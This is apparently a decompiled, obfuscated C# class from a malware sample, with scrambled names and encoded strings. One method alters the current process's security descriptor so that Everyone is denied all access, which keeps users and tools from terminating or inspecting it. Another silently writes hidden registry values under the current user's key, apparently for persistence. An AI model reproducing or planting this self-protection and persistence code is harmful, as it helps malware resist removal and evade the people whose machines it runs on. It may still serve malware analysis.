using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class btcnmxOkzDY
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DkuKtlzXKbHic, int JbYhmyihGEZhfCqx, [Out] byte[] WtHNesBComKXey, uint kWsfVAuQOapTl, out uint uTUvLZPhzguXmh);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr bdQzatFQZSwDYzRS, int bcikAScCOKSnDT, [In] byte[] cpBqzZJrayuyyN);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void dnjIozwnDTI(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107348693)));
			registryKey.SetValue(cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107349100)), getString_0(107350399));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor nIhKxcoPQGigcfdv(IntPtr intptr_0)
	{
		byte[] wtHNesBComKXey = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, wtHNesBComKXey, 0u, out var uTUvLZPhzguXmh);
		if ((long)uTUvLZPhzguXmh > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, wtHNesBComKXey = new byte[uTUvLZPhzguXmh], uTUvLZPhzguXmh, out uTUvLZPhzguXmh))
		{
			return null;
		}
		return new RawSecurityDescriptor(wtHNesBComKXey, 0);
	}

	private void bvgxPSjxoqJy(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void JQoQzrGBFnzT()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = nIhKxcoPQGigcfdv(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			bvgxPSjxoqJy(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static btcnmxOkzDY()
	{
		Strings.CreateGetStringDelegate(typeof(btcnmxOkzDY));
	}
}
